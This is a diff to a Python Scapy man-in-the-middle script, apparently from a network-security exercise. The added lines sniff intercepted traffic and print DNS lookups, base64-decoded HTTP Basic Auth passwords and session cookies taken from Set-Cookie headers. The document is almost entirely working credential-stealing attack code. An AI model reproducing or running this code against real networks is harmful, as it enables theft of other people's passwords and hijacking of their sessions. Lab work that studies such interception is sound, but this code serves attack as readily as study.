@@ -5,6 +5,7 @@ import argparse
 import sys
 import threading
 import time
+import base64
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
@@ -64,9 +65,50 @@ def handle_packet(p):
         if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
         if p[IP].dst == clientIP: p[Ether].dst = clientMAC
         sendp(p, iface=conf.iface)
+        if DNS in p:
+            if p[DNS].an is None:
+                print(f'*hostname:{p[DNS].qd.qname.decode("utf-8")}')
+            else:
+                print(f'*hostaddr:{p[DNS].an.rdata}')
+        elif TCP in p:
+            if p[IP].dst == httpServerIP and Raw in p:
+                auth = find_auth_password(p[Raw].load)
+                if auth is not None:
+                    print(f'*basicauth:{auth}')
+            elif p[IP].src == httpServerIP and Raw in p:
+                cookie = find_cookie(p[Raw].load)
+                if cookie is not None:
+                    print(f'*cookie:{cookie}')
     except Exception as e:
         debug(f'Error when sniffing: {e}')
-    pass
+
+
+def find_cookie(payload):
+    payload = payload.decode('utf-8')
+    payload = payload.split('\r\n')
+    cookie = None
+    for s in payload:
+        if s.find('Set-Cookie: session=') != -1:
+            cookie = s.split('=')[1]
+            break
+    return cookie
+
+
+def find_auth_password(payload):
+    payload = payload.decode('utf-8')
+    payload = payload.split('\r\n')
+    auth = None
+    for s in payload:
+        if s.find('Authorization:') != -1:
+            auth = s
+            break
+    if auth is not None:
+        auth = auth.split(' ')[2]
+        auth = base64.b64decode(auth)
+        auth = auth.decode('utf-8')
+        auth = auth.split(':')[1]
+    return auth
+
 
 # TODO: handle intercepted packets
 # NOTE: this intercepts all packets that are sent AND received by the attacker, so 
